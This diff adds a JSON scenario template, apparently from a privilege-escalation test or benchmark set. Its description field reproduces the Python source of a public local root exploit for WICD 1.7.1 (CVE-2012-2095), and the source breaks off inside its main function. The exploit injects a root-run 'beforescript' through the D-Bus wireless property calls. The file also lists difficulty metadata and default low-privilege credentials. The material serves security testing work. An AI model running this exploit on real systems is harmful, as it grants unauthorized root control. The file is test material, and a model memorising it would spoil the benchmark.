@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18733",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: WICD 1.7.1 - Local Privilege Escalation (CVE-2012-2095;OSVDB-81085)\n\nExploit source code (18733.py):\n```\n  #!/usr/bin/python\n#wicd <= 1.7.1 0day exploit discovered on 4.9.12 by InfoSec Institute student\n#For full write up and description go to http://www.infosecinstitute.com/courses/ethical_hacking_training.html\nimport sys\nimport os\nimport time\nimport getopt\n\ntry: from wicd import dbusmanager\nexcept: print \"[!] WICD Error: libraries are not available. Is WICD installed?\"; sys.exit(0)\n\nclass Error(Exception):\n\tdef __init__(self, error):\n\t\tself.errorStr=error\n\n\tdef __str__(self):\n\t\treturn repr(self.errorStr)\n\n\nclass Wicd():\n\twireless=None\n\tdaemon=None\n\tversionString=None\n\tdef __init__(self):\n\t\ttry:\n\t\t\tdbusmanager.connect_to_dbus()\n\t\t\tdbusInterfaces\t= dbusmanager.get_dbus_ifaces()\n\t\t\tself.wireless\t\t= dbusInterfaces[\"wireless\"]\n\t\t\tself.daemon\t\t= dbusInterfaces[\"daemon\"]\n\t\texcept:\n\t\t\traise Error(\"Daemon is not running\")\n\t\tself.versionString = self.daemon.Hello()\n\n\tdef versionLessThan(self, version):\n\t\tif int(self.versionString.replace(\".\",\"\"))<=version:\n\t\t\treturn True\n\t\telse:\n\t\t\treturn False\n\n\nclass Exploit():\n\n\tdef __init__(self, wicd, scriptPath):\n\t\tself.wicd = wicd\n\t\tself.scriptPath = scriptPath\n\n\tdef getNets(self):\n\t\tself.wicd.wireless.Scan(True)\n\t\tnets = self.wicd.wireless.GetNumberOfNetworks()\n\t\twhile nets < 1:\n\t\t\tself.wicd.wireless.Scan(True)\n\t\t\tnets = self.wicd.wireless.GetNumberOfNetworks()\n\t\tfor net in range(nets):\n\t\t\tyield net\n\n\tdef exploit(self):\n\n\t\tfor net in self.getNets(): pass # Priming scan.\n\n\t\ttry:\n\t\t\tself.wicd.wireless.SetWirelessProperty(0, \"beforescript = \"+ self.scriptPath +\"\\nrooted\", \"true\")\n\t\texcept:\n\t\t\traise Error(\"Unable to exploit (SetWirelessProperty() failed.)\")\n\n\t\ttry:\n\t\t\tself.wicd.wireless.SaveWirelessNetworkProperty(0, \"beforescript = \"+ self.scriptPath +\"\\nrooted\")\n\t\texcept:\n\t\t\traise Error(\"Unable to exploit (SetWirelessProperty() failed.)\")\n\n\t\tpropertyKey\t= 'bssid' # Could be essid, or any other identifiable wireless property\n\t\tvulnIdentifier\t= self.wicd.wireless.GetWirelessProperty(0, propertyKey)\n\n\t\t# TODO: Does this need a try construct?\n\t\tself.wicd.wireless.ReloadConfig()\n\n\t\tfor net in self.getNets(): # Implicit, but required re-scan.\n\t\t\tif self.wicd.wireless.GetWirelessProperty(net, propertyKey) == vulnIdentifier:\n\t\t\t\tself.wicd.wireless.ConnectWireless(net)\n\t\t\t\treturn True\n\t\traise Error(\"Unable to exploit (Lost the network we were using)\")\n\n\ndef usage():\n\tprint \"[!] Usage:\"\n\tprint \"\t( -h, --help ):\"\n\tprint \"\t\tPrint this message.\"\n\tprint \"\t( --scriptPath= ): Required, executable to run as root.\"\n\tprint \"\t\t--scriptPath=/some/path/to/executable.sh\"\n\ndef main():\n\tprint \"[$] WICD =< 1.7.0Day\"\n\ttry:\n\t\topts, args = getopt.getopt(sys.argv[1:], \"h\", [\"help\", \"scriptPath=\"])\n\texcept getopt.GetoptError, err:\n\t\t# Print help information and exit:\n\t\tprint '[!] Parameter error:' + str(err) # Will print something like \"option -a not recognized\"\n\t\tusage()\n\t\tsys.exit(0)\n\n\tscriptPath=None\n\n\tfor opt, arg in opts:\n\t\tif opt in (\"-h\", \"--help\"):\n\t\t\tusage()\n\t\t\tsys.exit(0)\n\t\telif opt ==\"--scriptPath\":\n\t\t\tscriptPath=arg\n\t\telse:\n\t\t\t# I would\n```",
+  "cve": "CVE-2012-2095;OSVDB-81085",
+  "exploitdb_id": "18733",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18733",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
